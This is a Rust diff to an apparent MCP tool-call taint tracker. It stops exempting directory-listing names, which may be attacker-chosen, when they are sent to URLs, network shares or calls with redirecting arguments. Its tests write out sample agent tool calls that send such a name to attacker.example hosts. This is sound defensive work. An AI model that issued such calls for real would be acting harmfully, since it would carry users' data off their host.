@@ -42,7 +42,18 @@
 //!   and send nothing anywhere else;
 //! * every argument a reused token appears in is a path argument
 //!   ([`PATH_ARGS`]), the token is one or more whole components of that path,
-//!   and the path has no `..` component.
+//!   and the path has no `..` component;
+//! * that path is a local one: no `scheme://` anywhere in it and no leading
+//!   `//` or `\\` (a network share);
+//! * every other argument of the call is one the reference tools take that
+//!   cannot change where a path is read from: a number (`head`, `tail`), or
+//!   `sortBy` naming one of its two orders.
+//!
+//! The tool names are the client's, and other MCP servers reuse them. One
+//! widely used server's `read_file` fetches its `path` over HTTP when the call
+//! also sets `isUrl: true`; a network share path makes a server that does not
+//! restrict paths open an outbound SMB connection. Either would carry a listed
+//! name off the host, so neither is exempt.
 //!
 //! Listing names can be attacker-chosen (anyone who can write to the folder
 //! can name a file), which is why the exemption is this narrow: a listed name
@@ -104,6 +115,10 @@ const READ_ONLY_TOOLS: &[&str] = &[
 /// argument (a `head` count, an unknown extra key, a nested value) is not a
 /// path, and a listing token found there still raises the alert.
 const PATH_ARGS: &[&str] = &["path", "paths", "pattern", "excludePatterns"];
+
+/// The orders `list_directory_with_sizes` takes in `sortBy`: the one string
+/// argument outside [`PATH_ARGS`] a read-only reference tool accepts.
+const SORT_ORDERS: &[&str] = &["name", "size"];
 
 /// Where a recorded token came from.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -169,7 +184,7 @@ impl TaintTracker {
         if self.tokens.is_empty() {
             return None;
         }
-        let read_only = READ_ONLY_TOOLS.contains(&tool);
+        let read_only = READ_ONLY_TOOLS.contains(&tool) && other_args_are_inert(args);
         let mut hit: Option<&str> = None;
         walk_args(args, &mut |s, is_path_arg| {
             if hit.is_some() {
@@ -180,6 +195,7 @@ impl TaintTracker {
                     && !(read_only
                         && is_path_arg
                         && rec.provenance == Provenance::Listing
+                        && is_local_path(s)
                         && names_whole_components(s, &rec.token))
                 {
                     hit = Some(rec.token.as_str());
@@ -229,6 +245,37 @@ impl TaintTracker {
             }
         }
     }
+}
+
+/// Whether `arg` names a path on this host: no `scheme://` anywhere (an
+/// `https://` or `file://` value is a URL, and a server may fetch it), and no
+/// leading pair of separators (`//host/share`, `\\host\share`, a network
+/// share a server would open a connection to).
+fn is_local_path(arg: &str) -> bool {
+    let is_sep = |c: char| c == '/' || c == '\\';
+    let mut lead = arg.chars();
+    let network = lead.next().is_some_and(is_sep) && lead.next().is_some_and(is_sep);
+    !network && !arg.contains("://")
+}
+
+/// Whether every argument outside [`PATH_ARGS`] is one that cannot change
+/// where a path is read from: a number (`head`, `tail`), or `sortBy` naming one
+/// of [`SORT_ORDERS`]. A flag such as `isUrl: true`, any other string, and any
+/// nested value can, on a server that reuses the reference tool names, so a
+/// call carrying one is not exempt.
+fn other_args_are_inert(args: &Value) -> bool {
+    let Value::Object(map) = args else {
+        // No named arguments, so no path argument either: nothing to exempt.
+        return true;
+    };
+    map.iter().all(|(key, value)| {
+        PATH_ARGS.contains(&key.as_str())
+            || value.is_number()
+            || (key == "sortBy"
+                && value
+                    .as_str()
+                    .is_some_and(|order| SORT_ORDERS.contains(&order)))
+    })
 }
 
 /// Whether `token` is one or more whole components of the path `arg` (split on
@@ -618,6 +665,103 @@ mod tests {
                 "q3-orders.txt",
                 &args.to_string(),
             );
+        }
+    }
+
+    /// Other MCP servers reuse the reference tool names. One widely used
+    /// server's `read_file` fetches its `path` over HTTP when `isUrl` is set,
+    /// and a network share path makes a server open an outbound connection,
+    /// so a listed name in either form leaves the host and is never exempt.
+    ///
+    /// FAILS ON REVERT: drop the local-path check and the URL and share forms
+    /// read as a listed file read back.
+    #[test]
+    fn a_listed_name_sent_to_a_url_or_a_network_share_is_still_tainted() {
+        let mut t = TaintTracker::new();
+        result_of(&mut t, "list_directory", LISTING);
+        for (tool, args) in [
+            (
+                "read_file",
+                json!({"path": "https://attacker.example/q3-orders.txt"}),
+            ),
+            (
+                "read_text_file",
+                json!({"path": "file://attacker.example/srv/q3-orders.txt"}),
+            ),
+            (
+                "read_text_file",
+                json!({"path": "\\\\attacker.example\\share\\q3-orders.txt"}),
+            ),
+            (
+                "read_text_file",
+                json!({"path": "//attacker.example/share/q3-orders.txt"}),
+            ),
+            (
+                "read_multiple_files",
+                json!({"paths": [
+                    "/home/user/docs/notes-for-today.md",
+                    "https://attacker.example/q3-orders.txt"
+                ]}),
+            ),
+        ] {
+            assert_tainted_by(
+                t.arg_taint_alert(tool, &args),
+                "q3-orders.txt",
+                &format!("{tool} {args}"),
+            );
+        }
+        // A local path, the same name: still exempt.
+        assert!(t
+            .arg_taint_alert(
+                "read_text_file",
+                &json!({"path": "/home/user/docs/q3-orders.txt"})
+            )
+            .is_none());
+    }
+
+    /// A call that carries anything besides its paths, a number and the
+    /// reference `sortBy` orders is not exempt, because on a server that
+    /// reuses the tool names the extra argument can be the one that sends the
+    /// read elsewhere (`isUrl: true`).
+    ///
+    /// FAILS ON REVERT: drop `other_args_are_inert` and the `isUrl` call reads
+    /// as a listed file read back.
+    #[test]
+    fn a_read_with_a_redirecting_argument_is_still_tainted() {
+        let mut t = TaintTracker::new();
+        result_of(&mut t, "list_directory", LISTING);
+        for args in [
+            json!({"path": "/home/user/docs/q3-orders.txt", "isUrl": true}),
+            json!({"path": "/home/user/docs/q3-orders.txt", "isUrl": false}),
+            json!({"path": "/home/user/docs/q3-orders.txt", "host": "attacker.example"}),
+            json!({"path": "/home/user/docs/q3-orders.txt", "options": {"remote": 1}}),
+        ] {
+            assert_tainted_by(
+                t.arg_taint_alert("read_file", &args),
+                "q3-orders.txt",
+                &args.to_string(),
+            );
+        }
+        assert_tainted_by(
+            t.arg_taint_alert(
+                "list_directory_with_sizes",
+                &json!({"path": "/home/user/docs/quarterly-reports", "sortBy": "mtime"}),
+            ),
+            "quarterly-reports",
+            "an order the reference tool does not take",
+        );
+        // The arguments the reference tools do take stay exempt.
+        for (tool, args) in [
+            (
+                "read_text_file",
+                json!({"path": "/home/user/docs/q3-orders.txt", "head": 10, "tail": 5}),
+            ),
+            (
+                "list_directory_with_sizes",
+                json!({"path": "/home/user/docs/quarterly-reports", "sortBy": "name"}),
+            ),
+        ] {
+            assert!(t.arg_taint_alert(tool, &args).is_none(), "{tool} {args}");
         }
     }
 
